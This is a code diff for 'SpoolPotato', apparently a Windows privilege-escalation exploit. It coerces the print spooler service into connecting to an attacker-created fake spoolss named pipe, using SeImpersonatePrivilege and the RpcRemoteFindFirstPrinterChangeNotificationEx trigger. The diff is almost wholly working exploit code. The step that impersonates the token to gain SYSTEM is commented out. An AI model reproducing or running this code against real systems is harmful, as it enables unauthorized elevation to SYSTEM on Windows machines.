@@ -144,18 +144,18 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 // Spool named pipe manipulation logic
 ////////
 
-BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent) {
+BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent, wchar_t **ppSpoolPipeUuidStr) {
 	UUID Uuid = { 0 };
 
-	if (UuidCreate(&Uuid) == RPC_S_OK) {
-		RPC_WSTR pUuidStr = NULL;
+	// Create the named pipe that the print spooler service will connect to over RPC. Setup an event associated with it for listener purposes.
 
-		if (UuidToStringW(&Uuid, &pUuidStr) == RPC_S_OK && pUuidStr != NULL) {
+	if (UuidCreate(&Uuid) == RPC_S_OK) {
+		if (UuidToStringW(&Uuid, ppSpoolPipeUuidStr) == RPC_S_OK && *ppSpoolPipeUuidStr != NULL) {
 			wchar_t FakePipeName[MAX_PATH + 1] = { 0 };
 			SECURITY_DESCRIPTOR Sd = { 0 };
 			SECURITY_ATTRIBUTES Sa = { 0 };
 
-			_snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pUuidStr);
+			_snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", *ppSpoolPipeUuidStr);
 			DebugLog(L"... generate fake spool pipe name of %ws", FakePipeName);
 
 			if (InitializeSecurityDescriptor(&Sd, SECURITY_DESCRIPTOR_REVISION)) {
@@ -189,42 +189,65 @@ BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent) {
 	return FALSE;
 }
 
-uint32_t SpoolPotato() {
-	LPWSTR pwszPipeName = NULL;
-	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
-	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
-	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
-	uint32_t dwWait = 0;
+uint32_t TriggerPrintSpoolerRpc(wchar_t *pSpoolPipeUuidStr) {
+	wchar_t ComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
+	uint32_t dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
 
+	if (GetComputerNameW(ComputerName, &dwComputerNameLen)) {
+		wchar_t TargetServer[MAX_PATH + 1] = { 0 };
+		wchar_t CaptureServer[MAX_PATH + 1] = { 0 };
+		DEVMODE_CONTAINER DevmodeContainer = { 0 };
+		PRINTER_HANDLE hPrinter = NULL;
+
+		_snwprintf_s(TargetServer, MAX_PATH, MAX_PATH, L"\\\\%ws", ComputerName);
+		_snwprintf_s(CaptureServer, MAX_PATH, MAX_PATH, L"\\\\%ws/pipe/%ws", ComputerName, pSpoolPipeUuidStr);
+
+		RpcTryExcept {
+			if (RpcOpenPrinter(TargetServer, &hPrinter, NULL, &DevmodeContainer, 0) == RPC_S_OK) {
+				RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, CaptureServer, 0, NULL);
+				RpcClosePrinter(&hPrinter);
+			}
+		}
+		RpcExcept(EXCEPTION_EXECUTE_HANDLER);
+		{
+			// Expect RPC_S_SERVER_UNAVAILABLE
+		}
+		RpcEndExcept;
+
+		if (hPrinter != NULL) {
+			RpcClosePrinter(&hPrinter);
+		}
+	}
+
+	return 0;
+}
+
+BOOL SpoolPotato() {
 	if (EnablePrivilege(SE_IMPERSONATE_NAME)) {
+		wchar_t* pSpoolPipeUuidStr = NULL;
+		HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
+		HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
+		HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
+		uint32_t dwWaitError = 0;
+
 		DebugLog(L"... successfully obtained %ws privilege", SE_IMPERSONATE_NAME);
 
-		if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent)) {
-			DebugLog(L"... named pipe creation and connection successful.");
-			DebugLog(L"[+] Named pipe listening...\n");
+		if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent, &pSpoolPipeUuidStr)) {
+			DebugLog(L"... named pipe creation and connection successful. Listening...");
+			CreateThread(NULL, 0, TriggerPrintSpoolerRpc, pSpoolPipeUuidStr, 0, NULL);
+			dwWaitError = WaitForSingleObject(hSpoolPipeEvent, 5000);
 
-			if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
-			{
-				DebugLog(L"[-] Failed to trigger the Spooler service.\n");
-				goto cleanup;
+			if (dwWaitError == WAIT_OBJECT_0) {
+				DebugLog(L"... recieved connection over named pipe");
 			}
-			/*
-			dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
-			if (dwWait != WAIT_OBJECT_0)
-			{
-				DebugLog(L"[-] Operation failed or timed out.\n");
-				goto cleanup;
+			else {
+				DebugLog(L"... named pipe listener failed with wait error %d", dwWaitError);
 			}
 
-			GetSystem(hSpoolPipe);
-			*/
-		cleanup:
-			if (hSpoolPipe)
-				CloseHandle(hSpoolPipe);
-			if (hSpoolPipeEvent)
-				CloseHandle(hSpoolPipeEvent);
-			if (hSpoolTriggerThread)
-				CloseHandle(hSpoolTriggerThread);
+			//GetSystem(hSpoolPipe);
+			
+			CloseHandle(hSpoolPipe);
+			CloseHandle(hSpoolPipeEvent);
 		}
 		else {
 			DebugLog(L"... named pipe creation and connection failed");
